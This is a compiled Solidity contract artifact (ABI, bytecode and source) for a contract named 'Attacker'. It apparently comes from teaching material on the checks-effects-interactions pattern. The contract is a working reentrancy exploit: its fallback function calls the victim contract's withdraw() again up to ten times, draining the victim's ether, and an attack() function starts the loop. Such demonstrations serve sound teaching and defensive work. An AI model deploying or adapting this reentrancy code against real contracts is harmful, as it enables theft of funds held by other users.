{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract ChecksEffectsInteractionsAntipattern",
          "name": "victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallback",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "victims_address",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "set_balance",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104103803806104108339818101604052602081101561003357600080fd5b810190808051906020019092919050505080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061033b806100d56000396000f3fe6080604052600436106100435760003560e01c806306661abd146101255780632c4b5586146101505780639c562b8c146101675780639e5faafc146101a857610044565b5b6001600081548092919060010191905055507ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a1600a60015410156101235760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010a57600080fd5b505af115801561011e573d6000803e3d6000fd5b505050505b005b34801561013157600080fd5b5061013a6101bf565b6040518082815260200191505060405180910390f35b34801561015c57600080fd5b506101656101c5565b005b34801561017357600080fd5b5061017c61025d565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101b457600080fd5b506101bd610283565b005b60015481565b6000670de0b6b3a76400009050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610252576040519150601f19603f3d011682016040523d82523d6000602084013e610257565b606091505b50505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102eb57600080fd5b505af11580156102ff573d6000803e3d6000fd5b5050505056fea2646970667358221220f6759af2b50b0e2c6e0325cd0eb6e10bebcef867ebb80fe80161db08b0e6f93164736f6c63430007000033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.7.0;\n\nimport './ChecksEffectsInteractionsAntipattern.sol';\n\ncontract Attacker {\n  ChecksEffectsInteractionsAntipattern v;\n  uint256 public count;\n  address public victims_address;\n\n  event LogFallback(uint c, uint balance);\n\n  constructor (ChecksEffectsInteractionsAntipattern victim) {\n    victims_address = address(victim);\n    v = ChecksEffectsInteractionsAntipattern(victim);\n  }\n\n  function set_balance () public {\n    uint _amount;\n    _amount = 1 ether;\n     victims_address.call{value: _amount}(\"\");\n  }\n\n  function attack () public {\n    v.withdraw();\n  }\n\n  fallback () external payable {\n    count++;\n    emit LogFallback(count, address(this).balance);\n    if (count < 10) {\n      v.withdraw();\n    } \n  }\n}",
  "sourcePath": "/home/niklas/Documents/HIWI PATTERNS/smart-contract-dev-support/Idioms/Checks-Effects-Interactions Pattern/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.7.0+commit.9e61f92b.Emscripten.clang"
  },
  "schemaVersion": "3.4.0",
  "updatedAt": "2021-05-26T15:24:04.962Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}